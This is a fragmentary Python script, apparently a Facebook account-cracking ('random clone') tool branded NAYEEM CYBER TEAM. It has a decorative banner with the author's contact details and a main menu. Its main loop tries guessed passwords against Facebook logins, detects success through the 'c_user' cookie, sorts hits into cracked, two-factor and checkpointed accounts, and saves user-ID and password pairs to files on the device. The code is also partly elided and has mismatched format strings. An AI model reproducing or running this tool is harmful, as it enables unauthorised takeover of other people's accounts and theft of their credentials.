...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑         NAYEEM  
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊    NAYEEM NAWAZ
\033[1;31m│\033[1;32m☞  \033[1;32m𝑮𝑹𝑶𝑷                 𝑴𝑨𝑺𝑻𝑬𝑹 𝑴𝑰𝑵𝑫 
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏     𝟎𝟏827673253      
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍     --- 4          
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄       nayeem nawaz
\033[1;37m╚🅑︎🅗︎🅣︎FACEBOOK TRICKS AND HELPING ZONE [NAYEEM]\033[1;37m🅑︎🅗︎🅣︎╝
\033[31;44m EVERYONE THINKS OF NAYEEM CYBER CHANGING THE WORLD     
 BUT NO ONE THINKS OF NAYEEM CYBER CHANGING HIMSELF.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mNAYEEM-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mNAYEEM-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : NAYEEM CYBER")
    print("\t  Fb page  : CYBER 99 TEAM")
    print("\t  Github   : NAYEEM CYBER 99-TEAM")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To NAYEEM-CYBER-TEAM Tool ....")
        time.sleep(2)
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_NAYEEM-CYBER-TEAM_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/ROOT.OFF.NAYEEM");xyz()
    elif hamii in ["4","04"]:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio NAYEEM_OK.mp3")
                print('\r\033[1;32m[NAYEEM-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio NAYEEM_2F.mp3")
                    print('\r\033[1;34m[NAYEEM-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/NAYEEM-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio NAYEEM_CP.mp3")
                    print(f'\r\033[1;30m[NAYEEM-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/NAYEEM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[NAYEEM-CYBER-TEAM🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
